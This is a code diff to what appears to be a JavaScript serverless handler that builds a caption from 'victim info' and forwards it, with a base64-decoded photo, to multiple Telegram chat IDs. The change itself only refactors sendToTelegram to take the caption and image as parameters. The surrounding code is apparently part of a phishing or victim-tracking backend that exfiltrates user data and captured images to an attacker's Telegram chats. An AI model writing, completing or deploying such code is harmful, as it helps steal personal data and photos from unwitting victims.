@@ -29,10 +29,11 @@ export default async function handler(req, res) {
     const caption = formatVictimInfo(userData);
 
     // Function to send data to Telegram
-    const sendToTelegram = async (chatId) => {
+    const sendToTelegram = async (chatId, caption, image) => {
         const formData = new FormData();
         formData.append('chat_id', chatId);
         formData.append('caption', caption);
+
         if (image) {
             const buffer = Buffer.from(image.split(',')[1], 'base64');
             formData.append('photo', buffer, { filename: 'photo.png' });
@@ -59,7 +60,9 @@ export default async function handler(req, res) {
 
     try {
         // Send to all specified chat IDs
-        const sendPromises = chatIds.map(chatId => sendToTelegram(chatId));
+        const sendPromises = chatIds.map(chatId =>
+            sendToTelegram(chatId, caption, image)
+        );
         await Promise.all(sendPromises);
 
         return res.status(200).send('Data sent successfully to all recipients');
